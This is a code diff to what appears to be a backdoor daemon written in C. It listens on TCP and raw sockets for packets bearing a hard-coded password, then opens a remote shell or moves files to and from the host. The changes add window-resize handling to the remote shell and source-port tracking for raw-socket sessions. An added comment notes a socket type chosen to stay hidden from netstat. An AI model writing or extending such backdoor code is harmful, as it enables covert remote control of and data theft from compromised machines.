@@ -13,6 +13,7 @@
 #include <errno.h>
 #include <sys/ioctl.h>
 #include <sys/wait.h>
+#include <termios.h>
 
 
 #include "raw.h"
@@ -188,7 +189,7 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
         close(sockw);
         exit(0);
     }
-    debug("file %s created!", file_path);
+    debug("file %s created!\n", file_path);
 
     bytes=0;
     while ((bytes = read(sockr, &buf, BUFSIZE)) > 0){
@@ -257,6 +258,7 @@ void launcher_shell(int sockr, int sockw) {
         while (1) {
             fd_set  fds;
             int count;
+            unsigned char *p;
 
             // put the fd to watch
             FD_ZERO(&fds);
@@ -275,7 +277,25 @@ void launcher_shell(int sockr, int sockw) {
                 count = read(sockr, buf, BUFSIZE);
                 // TODO: enviar char especial per setejar tamany tty, timeout, etc.
                 if ((count <= 0) && (errno != EINTR)) break;
-                if (write(pty, buf, count) <= 0 && (errno != EINTR)) break;
+                if ((p = memchr(buf, WCHAR, count))){
+                    debug("wchar\n");
+                    struct  winsize ws;
+                    int t;
+
+                    ws.ws_xpixel = ws.ws_ypixel = 0;
+                    ws.ws_col = (p[1] << 8) + p[2];
+                    ws.ws_row = (p[3] << 8) + p[4];
+                    if (ws.ws_col & ws.ws_row) {
+                        ioctl(pty, TIOCSWINSZ, &ws);
+                        kill(0, SIGWINCH);
+                    }
+                    // Write the other data
+                    write(pty, buf, p-buf);
+                    t = (buf+count) - (p+5);
+                    if (t > 0) write(pty, p+5, t);
+                } 
+                else if (memchr(buf, ECHAR, count)) break;
+                else if (write(pty, buf, count) <= 0 && (errno != EINTR)) break;
             }
         }
     }   
@@ -284,7 +304,7 @@ void launcher_shell(int sockr, int sockw) {
     waitpid(subshell, NULL, 0);
 }
 
-void do_action(struct data *d, struct in_addr *ip, int sock) {
+void do_action(struct data *d, struct in_addr *ip, short source,  int sock) {
     if (fork() != 0){
         return;
     }
@@ -293,7 +313,7 @@ void do_action(struct data *d, struct in_addr *ip, int sock) {
         case UPLOAD:
             debug("Uploading file\n");
             if (!getuid()) {
-
+                debug("Can not transfer files using direct RAW\n");
             } else {
                 launcher_upload(sock, sock, (char *)d->bytes, d->size);
                 close(sock);
@@ -302,7 +322,7 @@ void do_action(struct data *d, struct in_addr *ip, int sock) {
         case DOWNLOAD:
             debug("Downloading file\n");
             if (!getuid()) {
-
+                debug("Can not transfer files using direct RAW\n");
             } else {
                 launcher_download(sock, sock, (char *)d->bytes, d->size);
                 close(sock);
@@ -313,10 +333,11 @@ void do_action(struct data *d, struct in_addr *ip, int sock) {
             if (!getuid()) {
                 debug("Starting DirectRAW service\n");
                 struct rawsock *r = findrawsock(d->port);
-                if (launcher_directraw(r, ip->s_addr, 80, d->port, SERVERAUTH)) {
+                int pid;
+                if ((pid = swapd_raw(r, ip->s_addr, source, d->port, SERVERAUTH)) > 0) {
                     debug("done!\n");
                     launcher_shell(r->r[0], r->w[1]);
-                    // kill pid
+                    kill(pid, 15);
                 }
             } else {
                 launcher_shell(sock, sock);
@@ -398,7 +419,7 @@ void tcp_daemon(int port) {
             }
             if (!memcmp(CLIENTAUTH, d.pass, 20)) {
                 debug("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", d.action);
-                do_action(&d, &tcp.sin_addr, sock_con);
+                do_action(&d, &tcp.sin_addr, 0, sock_con);
             }
             exit(-1);
         }
@@ -413,7 +434,9 @@ void raw_daemon() {
     unsigned int slen = sizeof(raw);
     struct packet p;
     int size;
-
+    
+    //with this type, we will not appear on neststat, but we receive the layer 2 headers
+    //sock = socket(AF_INET, SOCK_RAW, 768);
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) {
         debug("Can't allocate raw socket\n");
@@ -433,8 +456,8 @@ void raw_daemon() {
                     debug("packet de sessio RAW (%d bytes)\n", p.action.size);
                     fill_raw_connection(findrawsock(p.action.port), p.action.bytes, p.action.size);
                 } else {
-                    debug("packet normal RAW\n");
-                    do_action(&(p.action), &raw.sin_addr, 0);
+                    debug("packet normal RAW %d => %d\n", ntohs(p.tcp.source), ntohs(p.tcp.dest));
+                    do_action(&(p.action), &raw.sin_addr, ntohs(p.tcp.dest), 0);
                 }
             }
         }
